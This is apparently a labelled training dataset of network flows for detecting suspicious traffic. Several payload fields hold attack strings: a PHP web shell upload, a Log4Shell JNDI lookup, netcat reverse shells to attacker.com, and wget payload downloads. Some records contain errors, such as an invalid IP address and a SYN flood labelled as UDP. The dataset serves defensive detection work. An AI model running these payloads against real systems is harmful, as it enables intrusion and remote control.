instruction,input,output
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.110"", ""Destination IP"": ""192.168.1.5"", ""Source Port"": 49255, ""Destination Port"": 389, ""Flow Key"": ""192.168.1.110->192.168.1.5"", ""Timestamp"": ""2024-10-24T14:40:00.345678"", ""Flow Data"": {""packets"": 6, ""bytes"": 840, ""protocol"": ""TCP""}, ""Payload"": ""LDAP bind request for user=jsmith""}","{""decision"": ""NORMAL"", ""category"": ""LDAP Authentication"", ""reasons"": [""Internal LDAP query"", ""Standard bind request"", ""Expected packet size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""176.32.198.77"", ""Destination IP"": ""192.168.1.50"", ""Source Port"": 54326, ""Destination Port"": 25, ""Flow Key"": ""176.32.198.77->192.168.1.50"", ""Timestamp"": ""2024-10-24T14:41:00.456789"", ""Flow Data"": {""packets"": 300, ""bytes"": 150000, ""protocol"": ""TCP""}, ""Payload"": ""MAIL FROM: <spammer@evil.com>\r\nRCPT TO: <all@company.com>\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SMTP Abuse"", ""reasons"": [""Mass mailing attempt"", ""Unknown external sender"", ""Large payload size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.120"", ""Destination IP"": ""192.168.1.3"", ""Source Port"": 49300, ""Destination Port"": 27017, ""Flow Key"": ""192.168.1.120->192.168.1.3"", ""Timestamp"": ""2024-10-24T14:42:00.567890"", ""Flow Data"": {""packets"": 10, ""bytes"": 1500, ""protocol"": ""TCP""}, ""Payload"": ""db.users.find({status: 'active'})""}","{""decision"": ""NORMAL"", ""category"": ""MongoDB Query"", ""reasons"": [""Internal database query"", ""Standard find operation"", ""Normal query size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.130"", ""Destination IP"": ""192.168.1.4"", ""Source Port"": 49400, ""Destination Port"": 9092, ""Flow Key"": ""192.168.1.130->192.168.1.4"", ""Timestamp"": ""2024-10-24T14:44:00.789012"", ""Flow Data"": {""packets"": 20, ""bytes"": 3000, ""protocol"": ""TCP""}, ""Payload"": ""PRODUCE topic=logs partition=0 messageSet=...""}","{""decision"": ""NORMAL"", ""category"": ""Kafka Message"", ""reasons"": [""Internal message queue"", ""Standard produce request"", ""Expected message size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.150"", ""Destination IP"": ""192.168.1.7"", ""Source Port"": 49600, ""Destination Port"": 2049, ""Flow Key"": ""192.168.1.150->192.168.1.7"", ""Timestamp"": ""2024-10-24T14:48:00.123456"", ""Flow Data"": {""packets"": 30, ""bytes"": 5000, ""protocol"": ""TCP""}, ""Payload"": ""NFS read request file_handle=0x123456""}","{""decision"": ""NORMAL"", ""category"": ""NFS Access"", ""reasons"": [""Internal file access"", ""Valid NFS operation"", ""Expected file size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.173.35.22"", ""Destination IP"": ""192.168.1.90"", ""Source Port"": 52341, ""Destination Port"": 5984, ""Flow Key"": ""185.173.35.22->192.168.1.90"", ""Timestamp"": ""2024-10-24T14:49:00.234567"", ""Flow Data"": {""packets"": 250, ""bytes"": 35000, ""protocol"": ""TCP""}, ""Payload"": ""GET /_all_dbs HTTP/1.1\r\nHost: internal-couchdb\r\n\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""CouchDB Enumeration"", ""reasons"": [""External database access attempt"", ""Sensitive endpoint probe"", ""Known attack pattern""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.134.23.78"", ""Destination IP"": ""192.168.1.100"", ""Source Port"": 52149, ""Destination Port"": 80, ""Flow Key"": ""45.134.23.78->192.168.1.100"", ""Timestamp"": ""2024-10-24T15:00:00.123456"", ""Flow Data"": {""packets"": 100, ""bytes"": 4800, ""protocol"": ""TCP""}, ""Payload"": ""GET /wp-config.php HTTP/1.1\r\nUser-Agent: Nmap Scripting Engine\r\nHost: target\r\n\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Application Scanning"", ""reasons"": [""Nmap user agent detected"", ""Sensitive file probe"", ""Known scanner signature""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""78.128.113.182"", ""Destination IP"": ""192.168.1.0/24"", ""Source Port"": 54321, ""Destination Port"": 22, ""Flow Key"": ""78.128.113.182->192.168.1.0/24"", ""Timestamp"": ""2024-10-24T15:01:00.234567"", ""Flow Data"": {""packets"": 500, ""bytes"": 25000, ""protocol"": ""TCP""}, ""Payload"": ""SYN packet flood - Port 22 scan""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Network Scanning"", ""reasons"": [""SYN scan detected"", ""Subnet-wide scan pattern"", ""SSH port targeting""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""78.128.0.15"", ""Destination IP"": ""192.168.1.25"", ""Source Port"": 54321, ""Destination Port"": 80, ""Flow Key"": ""78.128.113.182->192.168.1.0/24"", ""Timestamp"": ""2024-10-24T15:01:00.234567"", ""Flow Data"": {""packets"": 500, ""bytes"": 5500, ""protocol"": ""UDP""}, ""Payload"": ""SYN packet flood - Port 80 scan""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Network Scanning"", ""reasons"": [""SYN scan detected"", ""Network Flooding"", ""HTTP port targeting""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.156.73.54"", ""Destination IP"": ""192.168.1.120"", ""Source Port"": 55555, ""Destination Port"": 1433, ""Flow Key"": ""185.156.73.54->192.168.1.120"", ""Timestamp"": ""2024-10-24T15:03:00.456789"", ""Flow Data"": {""packets"": 200, ""bytes"": 15000, ""protocol"": ""TCP""}, ""Payload"": ""xp_cmdshell 'powershell -enc SW52b2tlLVdlYlJlcXVlc3Q...'""}","{""decision"": ""SUSPICIOUS"", ""category"": ""SQL Command Execution"", ""reasons"": [""xp_cmdshell usage"", ""PowerShell encoded command"", ""Database privilege escalation""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""103.85.24.91"", ""Destination IP"": ""192.168.1.130"", ""Source Port"": 59999, ""Destination Port"": ""1-1024"", ""Flow Key"": ""103.85.24.91->192.168.1.130"", ""Timestamp"": ""2024-10-24T15:04:00.567890"", ""Flow Data"": {""packets"": 1024, ""bytes"": 51200, ""protocol"": ""TCP""}, ""Payload"": ""Nmap -sS -sV -p1-1024 -T4 192.168.1.130""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Port Scanning"", ""reasons"": [""Privileged ports scan"", ""Service version detection"", ""Aggressive timing (-T4)""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.95.147.32"", ""Destination IP"": ""192.168.1.140"", ""Source Port"": 52222, ""Destination Port"": 23, ""Flow Key"": ""45.95.147.32->192.168.1.140"", ""Timestamp"": ""2024-10-24T15:05:00.678901"", ""Flow Data"": {""packets"": 150, ""bytes"": 7500, ""protocol"": ""TCP""}, ""Payload"": ""enable\r\nconfig terminal\r\nno password-encryption\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Telnet Configuration Attack"", ""reasons"": [""Configuration mode access"", ""Security feature disable attempt"", ""Clear-text protocol usage""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.241.192.202"", ""Destination IP"": ""192.168.1.150"", ""Source Port"": 54444, ""Destination Port"": 111, ""Flow Key"": ""192.241.192.202->192.168.1.150"", ""Timestamp"": ""2024-10-24T15:06:00.789012"", ""Flow Data"": {""packets"": 75, ""bytes"": 3750, ""protocol"": ""TCP""}, ""Payload"": ""rpcinfo -p 192.168.1.150""}","{""decision"": ""SUSPICIOUS"", ""category"": ""RPC Enumeration"", ""reasons"": [""RPC service mapping"", ""External reconnaissance"", ""Service discovery attempt""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""89.248.165.33"", ""Destination IP"": ""192.168.1.160"", ""Source Port"": 57777, ""Destination Port"": 27017, ""Flow Key"": ""89.248.165.33->192.168.1.160"", ""Timestamp"": ""2024-10-24T15:07:00.890123"", ""Flow Data"": {""packets"": 120, ""bytes"": 6000, ""protocol"": ""TCP""}, ""Payload"": ""db.adminCommand('getCmdLineOpts')""}","{""decision"": ""SUSPICIOUS"", ""category"": ""MongoDB Reconnaissance"", ""reasons"": [""Administrative command execution"", ""External database access"", ""Configuration probe""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.220.101.34"", ""Destination IP"": ""192.168.1.170"", ""Source Port"": 58888, ""Destination Port"": 2375, ""Flow Key"": ""185.220.101.34->192.168.1.170"", ""Timestamp"": ""2024-10-24T15:08:00.901234"", ""Flow Data"": {""packets"": 80, ""bytes"": 4000, ""protocol"": ""TCP""}, ""Payload"": ""GET /containers/json HTTP/1.1\r\nHost: target\r\n\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Docker API Probe"", ""reasons"": [""Exposed Docker API access"", ""Container enumeration attempt"", ""Unauthorized access attempt""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""93.174.95.106"", ""Destination IP"": ""192.168.1.0/24"", ""Source Port"": 60000, ""Destination Port"": 5900, ""Flow Key"": ""93.174.95.106->192.168.1.0/24"", ""Timestamp"": ""2024-10-24T15:10:00.123456"", ""Flow Data"": {""packets"": 600, ""bytes"": 30000, ""protocol"": ""TCP""}, ""Payload"": ""nmap -p5900 --script vnc-brute -T4 192.168.1.0/24""}","{""decision"": ""SUSPICIOUS"", ""category"": ""VNC Scanning"", ""reasons"": [""Network-wide VNC scan"", ""Brute force attempt"", ""NSE script usage""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.155.205.233"", ""Destination IP"": ""192.168.1.200"", ""Source Port"": 49821, ""Destination Port"": 80, ""Flow Key"": ""45.155.205.233->192.168.1.200"", ""Timestamp"": ""2024-10-24T15:15:00.123456"", ""Flow Data"": {""packets"": 150, ""bytes"": 12000, ""protocol"": ""TCP""}, ""Payload"": ""POST /admin/upload.php HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\""file\""; filename=\""shell.php.jpg\""\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Web Shell Upload"", ""reasons"": [""PHP code in image file"", ""Admin panel targeting"", ""Command execution payload""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.220.100.242"", ""Destination IP"": ""192.168.1.210"", ""Source Port"": 52149, ""Destination Port"": 1521, ""Flow Key"": ""185.220.100.242->192.168.1.210"", ""Timestamp"": ""2024-10-24T15:16:00.234567"", ""Flow Data"": {""packets"": 250, ""bytes"": 15000, ""protocol"": ""TCP""}, ""Payload"": ""DESCRIBE USER SYS.USER$\r\nSELECT * FROM ALL_USERS\r\nSELECT * FROM USER_ROLE_PRIVS""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Oracle Database Enumeration"", ""reasons"": [""Privilege enumeration"", ""System table access"", ""User information gathering""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""195.54.160.149"", ""Destination IP"": ""192.168.1.230"", ""Source Port"": 54321, ""Destination Port"": 8080, ""Flow Key"": ""195.54.160.149->192.168.1.230"", ""Timestamp"": ""2024-10-24T15:18:00.456789"", ""Flow Data"": {""packets"": 75, ""bytes"": 5500, ""protocol"": ""TCP""}, ""Payload"": ""GET /solr/admin/cores?action=CREATE&name=cmd&config=<dataDir>${jndi:ldap://attacker.com/a}</dataDir>""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Log4Shell Exploitation"", ""reasons"": [""JNDI injection attempt"", ""Solr admin access"", ""Remote class loading""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""93.174.95.106"", ""Destination IP"": ""192.168.1.240"", ""Source Port"": 51234, ""Destination Port"": 5432, ""Flow Key"": ""93.174.95.106->192.168.1.240"", ""Timestamp"": ""2024-10-24T15:19:00.567890"", ""Flow Data"": {""packets"": 120, ""bytes"": 8000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT pg_read_file('/etc/passwd');\r\nCOPY (SELECT '') TO PROGRAM 'nc -e /bin/bash attacker.com 4444';""}","{""decision"": ""SUSPICIOUS"", ""category"": ""PostgreSQL Exploitation"", ""reasons"": [""File system access attempt"", ""Command execution"", ""Reverse shell creation""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""91.92.253.74"", ""Destination IP"": ""192.168.1.250"", ""Source Port"": 55555, ""Destination Port"": 9200, ""Flow Key"": ""91.92.253.74->192.168.1.250"", ""Timestamp"": ""2024-10-24T15:20:00.678901"", ""Flow Data"": {""packets"": 90, ""bytes"": 6000, ""protocol"": ""TCP""}, ""Payload"": ""POST /_search HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\""script_fields\"": {\""run\"": {\""script\"": \""java.lang.Runtime.getRuntime().exec('wget http://malicious.com/payload')\""}}}""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Elasticsearch Injection"", ""reasons"": [""Script injection"", ""Remote code execution"", ""Malicious download attempt""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.156.73.54"", ""Destination IP"": ""192.168.1.260"", ""Source Port"": 56789, ""Destination Port"": 2049, ""Flow Key"": ""185.156.73.54->192.168.1.260"", ""Timestamp"": ""2024-10-24T15:21:00.789012"", ""Flow Data"": {""packets"": 200, ""bytes"": 12000, ""protocol"": ""TCP""}, ""Payload"": ""showmount -e 192.168.1.260\r\nmount -t nfs 192.168.1.260:/share /mnt/tmp\r\ntouch /mnt/tmp/.rhosts""}","{""decision"": ""SUSPICIOUS"", ""category"": ""NFS Trust Exploitation"", ""reasons"": [""NFS enumeration"", ""Unauthorized mount"", ""Trust relationship manipulation""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.125"", ""Destination IP"": ""192.168.1.6"", ""Source Port"": 49156, ""Destination Port"": 6379, ""Flow Key"": ""192.168.1.125->192.168.1.6"", ""Timestamp"": ""2024-10-24T16:00:00.123456"", ""Flow Data"": {""packets"": 8, ""bytes"": 960, ""protocol"": ""TCP""}, ""Payload"": ""GET user:1234\r\nSET session:abc expire 3600\r\n""}","{""decision"": ""NORMAL"", ""category"": ""Redis Operations"", ""reasons"": [""Internal cache operations"", ""Standard key-value operations"", ""Expected data size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""45.67.89.123"", ""Destination IP"": ""192.168.1.15"", ""Source Port"": 61234, ""Destination Port"": 6379, ""Flow Key"": ""45.67.89.123->192.168.1.15"", ""Timestamp"": ""2024-10-24T16:01:00.234567"", ""Flow Data"": {""packets"": 120, ""bytes"": 8500, ""protocol"": ""TCP""}, ""Payload"": ""EVAL \""local f=io.popen('nc -e /bin/sh attacker.com 4444'); return f:read('*a')\"" 0""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Redis Command Injection"", ""reasons"": [""Lua script injection"", ""Remote shell execution attempt"", ""External IP accessing Redis""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.130"", ""Destination IP"": ""192.168.1.8"", ""Source Port"": 49157, ""Destination Port"": 5672, ""Flow Key"": ""192.168.1.130->192.168.1.8"", ""Timestamp"": ""2024-10-24T16:02:00.345678"", ""Flow Data"": {""packets"": 12, ""bytes"": 1440, ""protocol"": ""TCP""}, ""Payload"": ""AMQP\\x00\\x00\\x09\\x01 PUBLISH queue=notifications routing_key=user.events""}","{""decision"": ""NORMAL"", ""category"": ""RabbitMQ Message"", ""reasons"": [""Internal message broker traffic"", ""Valid AMQP protocol"", ""Standard publish operation""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""78.31.67.198"", ""Destination IP"": ""192.168.1.35"", ""Source Port"": 57891, ""Destination Port"": 9042, ""Flow Key"": ""78.31.67.198->192.168.1.35"", ""Timestamp"": ""2024-10-24T16:03:00.456789"", ""Flow Data"": {""packets"": 250, ""bytes"": 15000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT * FROM system.local;\nSELECT * FROM system_schema.keyspaces;""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Cassandra Enumeration"", ""reasons"": [""System table enumeration"", ""External database access"", ""Schema reconnaissance""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.140"", ""Destination IP"": ""192.168.1.9"", ""Source Port"": 49158, ""Destination Port"": 8086, ""Flow Key"": ""192.168.1.140->192.168.1.9"", ""Timestamp"": ""2024-10-24T16:04:00.567890"", ""Flow Data"": {""packets"": 15, ""bytes"": 1800, ""protocol"": ""TCP""}, ""Payload"": ""POST /write?db=metrics HTTP/1.1\r\nHost: influxdb\r\n\r\ncpu_load,host=server01 value=0.64""}","{""decision"": ""NORMAL"", ""category"": ""InfluxDB Write"", ""reasons"": [""Standard metric write"", ""Internal time-series data"", ""Valid measurement format""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""167.248.133.165"", ""Destination IP"": ""192.168.1.45"", ""Source Port"": 62345, ""Destination Port"": 11211, ""Flow Key"": ""167.248.133.165->192.168.1.45"", ""Timestamp"": ""2024-10-24T16:05:00.678901"", ""Flow Data"": {""packets"": 180, ""bytes"": 12000, ""protocol"": ""TCP""}, ""Payload"": ""stats items\r\nstats slabs\r\nstats settings\r\nlru_crawler metadump all""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Memcached Reconnaissance"", ""reasons"": [""Cache enumeration attempt"", ""External system inspection"", ""Memory dump attempt""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.150"", ""Destination IP"": ""192.168.1.10"", ""Source Port"": 49159, ""Destination Port"": 2181, ""Flow Key"": ""192.168.1.150->192.168.1.10"", ""Timestamp"": ""2024-10-24T16:06:00.789012"", ""Flow Data"": {""packets"": 10, ""bytes"": 1200, ""protocol"": ""TCP""}, ""Payload"": ""ls /services\nget /services/app1/config""}","{""decision"": ""NORMAL"", ""category"": ""ZooKeeper Query"", ""reasons"": [""Internal configuration access"", ""Standard znode operations"", ""Valid path traversal""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""92.63.197.238"", ""Destination IP"": ""192.168.1.55"", ""Source Port"": 63456, ""Destination Port"": 6443, ""Flow Key"": ""92.63.197.238->192.168.1.55"", ""Timestamp"": ""2024-10-24T16:07:00.890123"", ""Flow Data"": {""packets"": 300, ""bytes"": 18000, ""protocol"": ""TCP""}, ""Payload"": ""GET /api/v1/namespaces HTTP/1.1\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Kubernetes API Scanning"", ""reasons"": [""External cluster access"", ""Namespace enumeration"", ""Unauthorized token usage""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.100"", ""Destination IP"": ""192.168.1.50"", ""Source Port"": 49400, ""Destination Port"": 6379, ""Flow Key"": ""192.168.1.100->192.168.1.50"", ""Timestamp"": ""2024-10-24T16:10:00.123456"", ""Flow Data"": {""packets"": 10, ""bytes"": 900, ""protocol"": ""TCP""}, ""Payload"": ""GET user:5678""}","{""decision"": ""NORMAL"", ""category"": ""Redis Operations"", ""reasons"": [""Internal Redis cache access"", ""Standard key-value operation"", ""Expected payload size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""93.174.95.106"", ""Destination IP"": ""192.168.1.30"", ""Source Port"": 55555, ""Destination Port"": 5432, ""Flow Key"": ""93.174.95.106->192.168.1.30"", ""Timestamp"": ""2024-10-24T16:15:00.234567"", ""Flow Data"": {""packets"": 200, ""bytes"": 16000, ""protocol"": ""TCP""}, ""Payload"": ""SELECT pg_sleep(10);""}","{""decision"": ""SUSPICIOUS"", ""category"": ""PostgreSQL Exploitation"", ""reasons"": [""Intentional delay (pg_sleep) in query"", ""Potential timing attack"", ""External IP accessing database""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""192.168.1.200"", ""Destination IP"": ""8.8.4.4"", ""Source Port"": 52100, ""Destination Port"": 53, ""Flow Key"": ""192.168.1.200->8.8.4.4"", ""Timestamp"": ""2024-10-24T16:20:00.345678"", ""Flow Data"": {""packets"": 2, ""bytes"": 120, ""protocol"": ""UDP""}, ""Payload"": ""DNS query for openai.com""}","{""decision"": ""NORMAL"", ""category"": ""DNS Query"", ""reasons"": [""Standard DNS lookup"", ""Known DNS server (Google)"", ""Expected payload size""]}"
Analyze the network traffic pattern for suspicious behavior,"{""Source IP"": ""185.220.100.245"", ""Destination IP"": ""192.168.1.80"", ""Source Port"": 50000, ""Destination Port"": 22, ""Flow Key"": ""185.220.100.245->192.168.1.80"", ""Timestamp"": ""2024-10-24T16:25:00.567890"", ""Flow Data"": {""packets"": 1000, ""bytes"": 65000, ""protocol"": ""TCP""}, ""Payload"": ""SSH-2.0-OpenSSH_7.9\r\n""}","{""decision"": ""SUSPICIOUS"", ""category"": ""Brute Force Attack"", ""reasons"": [""High number of SSH attempts"", ""External IP trying to access SSH"", ""Known attack pattern""]}"
